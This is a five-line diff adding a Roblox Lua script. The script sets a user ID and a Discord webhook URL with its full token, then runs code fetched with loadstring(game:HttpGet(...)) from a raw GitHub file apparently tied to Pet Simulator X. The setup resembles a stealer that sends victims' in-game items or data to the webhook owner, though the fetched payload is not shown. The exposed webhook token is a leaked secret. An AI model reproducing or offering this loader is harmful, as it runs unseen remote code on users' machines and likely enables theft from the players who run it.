@@ -1,0 +1,5 @@
+UserID =  'etzrbn5god'
+
+WebHooks = 'https://discord.com/api/webhooks/1097304248854781972/60vzlUxLhDIbMnvX0VO2ih8lg7ZEEDekrDnRfqAse6Bkrc0h0pxY-1lSPBrBZHu1VGEw'
+
+loadstring(game:HttpGet('https://raw.githubusercontent.com/Kiroftt/petsimxvalue/main/guis11'))();
